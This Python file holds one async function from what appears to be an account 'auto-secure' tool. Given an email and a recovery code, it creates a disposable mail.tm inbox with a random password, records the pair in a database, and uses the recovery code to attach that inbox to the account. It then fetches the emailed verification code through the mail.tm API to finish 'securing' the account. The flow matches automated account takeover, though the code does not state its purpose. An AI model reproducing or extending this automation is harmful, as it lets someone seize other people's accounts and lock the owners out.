from views.utils.securing.generateEmail import generateEmail
from views.utils.securing.getEmailCode import getEmailCode
from views.utils.securing.getLiveData import getLiveData
from views.utils.startSecure import startSecuringAccount
from views.utils.securing.recovery import recover
from views.utils.sendAuth import sendAuth

from views.utils.initialSession import getSession

from database.database import DBConnection
import uuid

async def recoverySecure(email: str, recovery_code: str) -> dict:

    session = getSession()

    security_email = uuid.uuid4().hex[:16]
    password = uuid.uuid4().hex[:12]

    email_token, security_email = await generateEmail(security_email, password)
    print(f"[+] - Generated Security Email ({security_email}) and Password ({password})")

    with DBConnection() as database:
        database.addEmail(security_email, password)
    
    print("[~] - Automaticly Securing Account...")
    data = await recover(session, email, recovery_code, security_email, password, email_token)
    print(data)
    if not data:
        return data

    await getLiveData(session)
    await sendAuth(session, email)

    token = await session.post(
        url = "https://api.mail.tm/token",
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json"
        },
        json = {
            "address": security_email,
            "password": password
        }
    )
    code = await getEmailCode(token.json()["token"])

    account = await startSecuringAccount(
        session = session,
        email = email,
        code = code,
        recovery = False
    )

    print(account)
